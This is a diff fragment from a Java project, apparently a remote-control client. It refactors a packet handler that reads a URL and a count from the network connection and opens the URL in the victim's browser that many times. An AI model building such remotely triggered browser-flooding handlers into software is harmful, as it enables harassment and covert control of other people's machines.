@@ -9,8 +9,8 @@ public class Packet39VisitManyURLs extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
-		String url = Connection.instance.readLine();
-		int times = Connection.instance.readInt();
+		String url = con.readLine();
+		int times = con.readInt();
 		try {
 			for (int i = 0; i < times; i++) {
 				java.awt.Desktop.getDesktop().browse(new URI(url));
